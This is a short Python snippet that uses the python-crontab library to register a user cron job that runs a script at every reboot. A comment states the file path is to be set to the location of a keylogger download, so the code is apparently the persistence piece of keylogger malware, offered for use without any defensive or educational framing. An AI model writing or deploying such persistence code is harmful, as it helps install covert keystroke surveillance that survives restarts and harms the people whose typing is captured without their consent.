from crontab import CronTab


def cron():
    my_cron = CronTab(user=True)
    job = my_cron.new(command='python <FILEPATH>')  # edit filepath to location of keylogger download
    job.every_reboot()
    my_cron.write()
